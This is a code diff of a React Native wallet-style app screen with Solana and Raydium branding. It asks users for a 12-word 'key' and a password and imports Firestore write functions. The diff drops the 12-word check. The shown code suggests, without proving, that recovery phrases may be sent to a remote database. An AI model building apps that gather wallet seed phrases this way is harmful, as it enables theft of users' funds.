@@ -1,14 +1,24 @@
 import React, { useEffect, useState } from 'react';
-import { StyleSheet, TextInput, Alert, KeyboardAvoidingView } from 'react-native';
+import { Animated, ScrollView, StyleSheet, Keyboard, Dimensions, ImageBackground, TextInput, Alert, KeyboardAvoidingView } from 'react-native';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import { Image } from "react-native-expo-image-cache";
 import { initializeApp } from 'firebase/app';
 import { getFirestore, setDoc, doc } from 'firebase/firestore';
 import { BlurView } from 'expo-blur';
+import Logo from './component/Svgatlas'
 import SvgAtlas from './component/Logosvg';
 import {
-  View, Text, Button, 
+  View, Text, Button, Colors,
+  Card, Typography
 } from 'react-native-ui-lib';
+import { NavigationContainer } from '@react-navigation/native';
+import { async } from '@firebase/util';
+
+const { width, height } = Dimensions.get("window");
+
+const atlas = require('../assets/icon/atlaslogo.png')
+const solana = require('../assets/icon/solana.png')
+const ray = require('../assets/icon/ray.png')
 
 
 const ButtonSpace = 20;
@@ -23,13 +33,27 @@ const firebaseConfig = {
   measurementId: "G-6YFE7TEXBL"
 }
 
+
+
+
+
+
 const preview = { uri: "https://mlgbzz6iaqdd.i.optimole.com/XzaT3g-ka1kldGy/w:auto/h:auto/q:74/https://djcleanto.com.br/wp-content/uploads/2014/01/black-background-hd-images.jpg" };
 const uri = 'https://i.ibb.co/wWmjsT1/solar-system-2.gif';
+const discord = require('../assets/images/discord.png')
 
-  const App = ({ navigation }) => {
+
+
+
+
+const App = ({ navigation }) => {
+
   const [key, setKey] = useState('');
+  const [keyVerifi, setKeyVerifi] = useState('');
+
   const [password, setPasseord] = useState('');
   const [repetpassword, setRepetpassword] = useState('');
+  const [quantidadePalavra, setQuantidadePalavra] = useState('');
 
 
   const enviar = async () => {
@@ -72,15 +96,6 @@ const uri = 'https://i.ibb.co/wWmjsT1/solar-system-2.gif';
     } else if (password != repetpassword) {
 
       alert('PASSWORDS DO NOT MATCH')
-
-
-    } else if
-
-      (key.slice(0, -1).split(" ").length - 1 !== 11) {
-
-
-      alert(`the key must contain 12 words separated by spaces
-      ` )
 
 
     } else if (!password || !repetpassword) {
